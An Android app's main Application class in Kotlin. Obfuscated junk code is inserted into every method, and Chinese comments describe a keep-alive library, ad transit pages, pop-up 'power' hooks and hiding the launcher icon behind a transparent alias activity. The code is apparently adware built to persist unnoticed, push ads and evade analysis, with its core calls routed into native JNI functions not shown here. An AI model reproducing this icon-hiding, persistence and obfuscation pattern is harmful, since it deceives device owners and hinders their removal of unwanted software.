package caq.dvigo.fau

import android.app.Application
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat.startActivity
import caq.dvigo.fau.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import caq.ooqz.noao.base.APPContext
import caq.ooqz.noao.base.BaseApplication
import caq.ooqz.noao.base.OverseaAppHost
import caq.ooqz.noao.base.OverseaAppInitializer
import caq.ooqz.noao.ad.runtime.AdLifecycleInstaller


class UBJO : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: UBJO? = null
    }

    override fun onCreate() {
        val arr_GTzEFXCy = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_QbNUKmwfu  = (arr_GTzEFXCy  shl 23) xor (arr_GTzEFXCy  shr 23)
         val j_GEkChJwHE  = i_QbNUKmwfu .inv() and 0xFFFF
         if (j_GEkChJwHE  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_bZYovhyOybNOTjr")
         }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 统一安装广告生命周期监听，内部带幂等保护
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val arr_QPicEAMlSz  = listOf("odLSBBaGV", "fsJckkLedBgOKLBe", "qhgdQbNYHMsEAtWAAG").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_DZApVkxwKbClZhC  = arr_QPicEAMlSz .filter { it.length > 8 }
         if (ad_DZApVkxwKbClZhC .isNotEmpty() && java.lang.System.currentTimeMillis() < 98) {
             ad_DZApVkxwKbClZhC .forEach { _ ->  }
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_COjyBsvUS = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_yWLqJBxkChOhT  = (arr_COjyBsvUS  shl 76) xor (arr_COjyBsvUS  shr 94)
         val j_FNCccYNEDQvcCdRXCqC  = i_yWLqJBxkChOhT .inv() and 0xFFFF
         if (j_FNCccYNEDQvcCdRXCqC  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_LxryyKoF")
         }
        XOEO.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
           val WCmiUsjTNYCoUTWXxY : Any = if (kotlin.random.Random.nextBoolean()) 14 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val hpkodajwECKXpGDNc  = (WCmiUsjTNYCoUTWXxY  as? String)?.reversed() ?: "jdUibdpbERGTA_-1375861560"

        if (hpkodajwECKXpGDNc  == "cLvLnG") {
            java.lang.System.out.print(hpkodajwECKXpGDNc )
        }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val EbBlmxp : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val VVGqlyMy  = EbBlmxp ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_35" 
            }
            if (VVGqlyMy .startsWith("qpVIVCaCgDsphaCL ")) {
                android.util.Log.v("TAG", VVGqlyMy )
            }
        // 启动图标隐藏：禁用 LFS 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, XOCV::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })

    }


    override fun initKeepPower(app: Application) {
           val HOkBgsL : Any = if (kotlin.random.Random.nextBoolean()) 22 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val kzuZnYfVpDRKZR  = (HOkBgsL  as? String)?.reversed() ?: "rwlXusaLQeyTXRvLM_1838344098"

        if (kzuZnYfVpDRKZR  == "afXbLeWOpzB") {
            java.lang.System.out.print(kzuZnYfVpDRKZR )
        }
        NativeJniUtils.virinit(insApp)
    }

}